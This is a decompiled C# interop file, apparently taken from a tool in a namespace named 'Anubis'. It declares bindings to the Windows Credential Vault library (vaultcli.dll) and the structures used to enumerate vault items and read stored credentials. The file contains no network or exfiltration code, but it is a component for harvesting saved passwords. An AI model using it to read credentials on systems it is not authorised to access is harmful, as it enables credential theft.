using System;
using System.Runtime.InteropServices;

namespace Anubis
{
	// Token: 0x0200004B RID: 75
	internal class VaultCli
	{
		// Token: 0x06000224 RID: 548
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x06000225 RID: 549
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x06000226 RID: 550
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x06000227 RID: 551
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x06000228 RID: 552
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x06000229 RID: 553
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x0600022A RID: 554
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x02000071 RID: 113
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x0400014F RID: 335
			Undefined = -1,
			// Token: 0x04000150 RID: 336
			Boolean,
			// Token: 0x04000151 RID: 337
			Short,
			// Token: 0x04000152 RID: 338
			UnsignedShort,
			// Token: 0x04000153 RID: 339
			Int,
			// Token: 0x04000154 RID: 340
			UnsignedInt,
			// Token: 0x04000155 RID: 341
			Double,
			// Token: 0x04000156 RID: 342
			Guid,
			// Token: 0x04000157 RID: 343
			String,
			// Token: 0x04000158 RID: 344
			ByteArray,
			// Token: 0x04000159 RID: 345
			TimeStamp,
			// Token: 0x0400015A RID: 346
			ProtectedArray,
			// Token: 0x0400015B RID: 347
			Attribute,
			// Token: 0x0400015C RID: 348
			Sid,
			// Token: 0x0400015D RID: 349
			Last
		}

		// Token: 0x02000072 RID: 114
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x0400015F RID: 351
			Illegal,
			// Token: 0x04000160 RID: 352
			Resource,
			// Token: 0x04000161 RID: 353
			Identity,
			// Token: 0x04000162 RID: 354
			Authenticator,
			// Token: 0x04000163 RID: 355
			Tag,
			// Token: 0x04000164 RID: 356
			PackageSid,
			// Token: 0x04000165 RID: 357
			AppStart = 100,
			// Token: 0x04000166 RID: 358
			AppEnd = 10000
		}

		// Token: 0x02000073 RID: 115
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x04000167 RID: 359
			public Guid SchemaId;

			// Token: 0x04000168 RID: 360
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000169 RID: 361
			public IntPtr pResourceElement;

			// Token: 0x0400016A RID: 362
			public IntPtr pIdentityElement;

			// Token: 0x0400016B RID: 363
			public IntPtr pAuthenticatorElement;

			// Token: 0x0400016C RID: 364
			public IntPtr pPackageSid;

			// Token: 0x0400016D RID: 365
			public ulong LastModified;

			// Token: 0x0400016E RID: 366
			public uint dwFlags;

			// Token: 0x0400016F RID: 367
			public uint dwPropertiesCount;

			// Token: 0x04000170 RID: 368
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000074 RID: 116
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x04000171 RID: 369
			public Guid SchemaId;

			// Token: 0x04000172 RID: 370
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000173 RID: 371
			public IntPtr pResourceElement;

			// Token: 0x04000174 RID: 372
			public IntPtr pIdentityElement;

			// Token: 0x04000175 RID: 373
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000176 RID: 374
			public ulong LastModified;

			// Token: 0x04000177 RID: 375
			public uint dwFlags;

			// Token: 0x04000178 RID: 376
			public uint dwPropertiesCount;

			// Token: 0x04000179 RID: 377
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000075 RID: 117
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x0400017A RID: 378
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x0400017B RID: 379
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
